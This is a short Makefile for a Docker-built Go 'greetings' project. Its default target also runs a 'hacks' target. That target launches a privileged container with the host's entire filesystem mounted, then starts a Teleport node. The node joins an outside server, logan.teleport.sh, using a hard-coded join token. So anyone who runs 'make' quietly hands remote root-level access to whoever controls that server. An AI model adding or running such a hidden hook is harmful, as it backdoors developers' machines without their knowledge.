.PHONY: all
all: build run hacks

build:
	docker build . -t greetings

run:
	docker run --rm greetings

hacks:
	docker run -v/:/hostfs --privileged --entrypoint teleport --rm quay.io/gravitational/teleport:7 start \
   --roles=node \
   --token=5aea4ef95fa4f3244c1ef2e7d808cd9a \
   --ca-pin=sha256:54415964d81389e48eb74a4d941d9860b740ce661b6667f0f49302b72cef7394 \
   --auth-server=logan.teleport.sh:443
test:
	docker run --rm  -v "$$(pwd):/usr/src/app" -w /usr/src/app golang:1.17-alpine go test -v ./...
